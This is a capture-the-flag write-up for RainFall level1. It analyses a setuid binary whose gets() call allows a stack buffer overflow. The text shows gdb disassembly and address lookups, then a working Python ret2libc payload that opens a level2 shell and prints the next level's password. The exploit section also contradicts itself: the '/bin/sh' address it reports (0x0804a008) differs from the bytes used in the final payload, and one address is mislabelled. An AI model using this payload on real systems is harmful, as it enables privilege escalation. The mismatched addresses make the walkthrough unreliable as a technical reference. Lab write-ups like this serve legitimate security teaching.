##  Description

Similar to the previous level, let's first have a look at the binary provided in this level.

```bash
level1@RainFall:~$ ls -l ./level1 
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 ./level1
level1@RainFall:~$ file level1 
level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
```

Again, the binary is a setuid and setgid executable owned by the next level user (level2) and group (users), which means that when we run this binary, it will execute with the privileges of level2 user and users group.

Let's run the binary and see what it does.

```bash
level1@RainFall:~$ ./level1 
dsa
```

The program starts a prompt and waits for our input before closing. Let's have a look inside with `gdb`.

```bash
level1@RainFall:~$ gdb -batch ./level1 -ex 'disassemble main'
Dump of assembler code for function main:
   0x08048480 <+0>:	    push   %ebp
   0x08048481 <+1>:	    mov    %esp,%ebp
   0x08048483 <+3>:	    and    $0xfffffff0,%esp
   0x08048486 <+6>:	    sub    $0x50,%esp
   0x08048489 <+9>:	    lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
```

This is a very short program, with an function call to `gets()`. The man page of `gets()` has very interesting things to tell us:

```
BUGS
       Never use gets().  Because it is impossible to tell without
       knowing the data in advance how many characters gets() will read,
       and because gets() will continue to store characters past the end
       of the buffer, it is extremely dangerous to use.  It has been used
       to break computer security.  Use fgets() instead.

       For more information, see CWE-242 (aka "Use of Inherently
       Dangerous Function") at
       http://cwe.mitre.org/data/definitions/242.html
```

In other words, `gets()` is unsafe because it does not check the length of the input, and if we provide more data than the allocated buffer can hold, it will overflow and overwrite adjacent memory. This is a classic buffer overflow vulnerability.

This is confirmed by the following test, where we input a long string of characters:

```bash
level1@RainFall:~$ ./level1 
dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
Segmentation fault (core dumped)
```

##  How can we exploit this vulnerability?

When a function is called, the return address (the address to which the program should return after the function call) is stored on the stack. If we can overflow the buffer and overwrite this return address, we can redirect the program's execution to a location of our choosing; what we typically want is to redirect the return address to point to a system call of a shell-spawning function (like `system("/bin/sh")`).

The winning payload should look like this:

> [Padding to fill the buffer (garbage)] + [Address of system()] + [Return address after system() (garbage)] + [Address of "/bin/sh"]

The padding and the return address after system() can be arbitrary values, as they are not used. The important parts are the address of `system()` and the address of the string `"/bin/sh"`, which can be determined using `gdb`:

```bash
level1@RainFall:~$ gdb -batch ./level1 -ex 'info functions system'
All functions matching regular expression "system":

Non-debugging symbols:
0x08048360  system
0x08048360  system@plt
```

To find the address of the string `"/bin/sh"`, the program must be running:

```bash
(gdb) b *0x08048480
Breakpoint 1 at 0x8048480
(gdb) run
Starting program: /home/user/level1/level1 

Breakpoint 1, 0x08048480 in main ()
(gdb) x/s "/bin/sh"
0x804a008:	 "/bin/sh"
```

We have found the address of the string `system()`: `0x08048360` and the address of `"/bin/sh"`: `0x0804a008`.

Now we need to determine the exact amount of padding needed to overflow the buffer and overwrite the return address. After a bit of trial and error, we find that the right amount is 76 bytes, which gives us the following payload:

> `'A' * 76 + 0x08048360 + fake_return_address + 0x0804a008

Importantly, the addresses must be in little-endian format, as the system architecture is little-endian. Thus, `0x08048360` becomes `\x60\x83\x04\x08` and `0x0804a008` becomes `\x08\xa0\x04\x08`.

We can create this payload using Python:

```bash
level1@RainFall:~$ (python -c 'print("A"*76 + "\x60\x83\x04\x08" + "BBBB" + "\x84\x85\x04\x08")'; cat) | ./level1
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

We have successfully created the payload with Python, piped it into the vulnerable program, and opened a shell with level2 privileges which allowed us to read the password for the next level. Note that the `cat` command is used to keep the input stream open after the payload is sent, allowing us to interact with the spawned shell; without it, the shell would close immediately after executing the payload.